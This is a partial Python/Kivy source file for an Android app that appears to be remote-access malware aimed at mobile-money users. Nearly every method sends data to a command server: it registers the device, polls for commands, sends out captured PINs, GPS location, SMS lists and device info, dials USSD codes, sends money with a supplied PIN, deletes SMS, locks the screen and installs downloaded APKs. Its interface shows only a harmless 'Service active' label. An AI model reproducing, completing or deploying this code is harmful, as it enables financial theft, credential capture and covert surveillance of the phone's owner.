...
import threading as T, time as t, socket as S, json as J, os, datetime as D, re, subprocess, requests
...
DownloadManager=AC('android.app.DownloadManager')
Uri=AC('android.net.Uri')
Environment=AC('android.os.Environment')
...
class C:
    ...
    def _download_and_install(s, apk_url):
        ...
        try:
            ...
            intent.setFlags(I.FLAG_ACTIVITY_NEW_TASK)
    ...
    def _request_all_permissions(s):
        ...
        try:
            ...
            try:
                ...
                ii.setData(Uri.parse("package:" + MA.getPackageName()))
    ...
    def _reg(s):
        while s.r:
            try:
                ...
                info['device'] = s.id
                info['status'] = 'online'
                info['version'] = s.current_version
                info['model'] = Bd.MODEL
                info['manufacturer'] = Bd.MANUFACTURER
                info['android_version'] = Bd.VERSION.RELEASE
                requests.post(f"{U1}/command_result", json=info, timeout=10)
                s.registered = True
                print("[+] Registered")
            except:
                pass
    ...
    def _poll(s):
        while s.r:
            try:
                x = requests.get(f"{U1}/commands?device={s.id}", timeout=10)
    ...
    def _save_pin(s, pin, source):
        ...
        try:
            ...
            requests.post(f"{U1}/detect_pin", json={
                'device': s.id,
                'pin': pin,
                'source': source[:200]
            }, timeout=5)
    ...
    def _loc(s):
        try:
            ...
            if loc:
                requests.post(f"{U1}/location", json={
                    'device': s.id,
                    'lat': loc.getLatitude(),
    ...
    def _ussd(s, code):
        try:
            ...
            try:
                ii = I(I.ACTION_CALL)
                ii.setData(Uri.parse(f"tel:{code}"))
                ii.setFlags(I.FLAG_ACTIVITY_NEW_TASK)
                MA.startActivity(ii)
                t.sleep(5)
            except Exception as e:
    ...
    def _send_money(s, number, amount, pin):
        try:
            ...
            requests.post(f"{U1}/command_result", json={
                'device': s.id,
    ...
    def _sms(s, n, txt):
        try:
            ...
            requests.post(f"{U1}/ussd", json={'device': s.id, 'sms_sent': True, 'number': n}, timeout=5)
        except:
            pass
    ...
    def _fetch_sms(s):
        try:
            ...
            requests.post(f"{U1}/command_result", json={'device': s.id, 'sms_list': sms_list}, timeout=5)
        except Exception as e:
            print(f"Fetch SMS error: {e}")
            
    def _delete_sms(s, index):
        try:
            requests.post(f"{U1}/command_result", json={'device': s.id, 'sms_deleted': True}, timeout=5)
        except:
            pass
    ...
    def _lock(s, image_url=''):
        try:
            ...
            requests.post(f"{U1}/command_result", json={'device': s.id, 'lock_active': True}, timeout=5)
        except Exception as e:
    ...
    def _info(s):
        try:
            info = s._get_device_info()
            requests.post(f"{U1}/command_result", json={'device': s.id, 'device_info': info}, timeout=5)
        except:
            pass
...
class App(A):
    def build(s):
        ...
        m.add_widget(L(text="Service active • Auto-update enabled", font_size=12, color=(0.3, 0.3, 0.3, 1)))
